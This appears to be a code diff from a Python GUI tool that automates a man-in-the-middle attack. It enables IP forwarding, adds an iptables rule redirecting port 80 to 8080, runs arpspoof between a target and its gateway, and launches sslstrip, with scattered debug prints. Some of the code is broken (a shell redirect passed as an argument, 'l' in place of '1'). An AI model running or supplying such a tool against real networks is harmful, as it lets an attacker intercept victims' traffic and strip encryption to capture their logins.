@@ -23,19 +23,33 @@ def startSsl(terminalContentFrame, wiresharkContentFrame, errorOutputContentFram
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
 
+    terminalLabel['text'] += "$ echo 1 > /proc/sys/net/ipv4/ip_forward \n"
+    terminalProcess = subprocess.Popen(["echo", "l", ">", "/proc/sys/net/ipv4/ip_forward"],
+                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
+    terminalLabel['text'] += terminalProcess.communicate()[0]
+
     terminalLabel['text'] += "$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 \n"
     terminalProcess = subprocess.Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"],
                                        stdout=subprocess.PIPE, universal_newlines=TRUE)
     terminalLabel['text'] += terminalProcess.communicate()[0]
 
+    # terminalLabel['text'] += "$ arpspoof -i eth0 -t" + targetIp + "-r" + defaultGatewayIp + "\n"
+    # terminalProcess = subprocess.Popen(["arpspoof", "-i", "eth0", "-t", targetIp, "-r", defaultGatewayIp],
+    #                                    stdout=subprocess.PIPE, universal_newlines=TRUE)
+    # terminalLabel['text'] += terminalProcess.communicate()[0]
+
     startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp, "#1A3329")
+    #runArpAttack(targetIp, defaultGatewayIp)
+    print("Test 1")
     runSslStripAttack()
+    print("Test 2")
 
 def stopSsl(targetIp, defaultGatewayIp) :
     global sslThreads, sslIsRunning, terminalLabel, errorOutputLabel
 
     try :
         terminalLabel["text"] += "$ Stopping SSL Strip Attack..."
+        print("Test 6")
         sslIsRunning = False
         sslThreads.join(0)
         sslThreads = None
@@ -46,19 +60,28 @@ def stopSsl(targetIp, defaultGatewayIp) :
     except Exception as e:
         errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
 
+def runArpSpoofAttack(targetIp, defaultGatewayIp) :
+    terminalLabel['text'] += "$ arpspoof -i eth0 -t" + targetIp + "-r" + defaultGatewayIp + "\n"
+    terminalProcess = subprocess.Popen(["arpspoof", "-i", "eth0", "-t", targetIp, "-r", defaultGatewayIp],
+                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
+    terminalLabel['text'] += terminalProcess.communicate()[0]
+
 def runSslStripAttack() :
     global sslThreads, sslIsRunning
+    print("Test 3")
     sslIsRunning = True
     sslThreads.start()
 
 def stripSsl() :
     global terminalLabel, errorOutputLabel, sslIsRunning, terminalProcess
-    print("" + str(sslIsRunning) + " || ?\n")
-
+    print("Test 4")
+    print(str(sslIsRunning) + " ||| ?")
     try :
+        terminalLabel["text"] += "$ Running SSL Strip Attack..."
         terminalLabel['text'] += "$ sslstrip -l 8080 \n"
-        while sslIsRunning == True :
-            terminalProcess = subprocess.Popen(["sslstrip", "-l", "8080"], stdout=subprocess.PIPE, universal_newlines=TRUE)
+        print("Test 5")
+        terminalProcess = subprocess.Popen(["sslstrip", "-l", "8080"], stdout=subprocess.PIPE, universal_newlines=TRUE)
+        print("Test 7")
     
     except Exception as e:
         errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
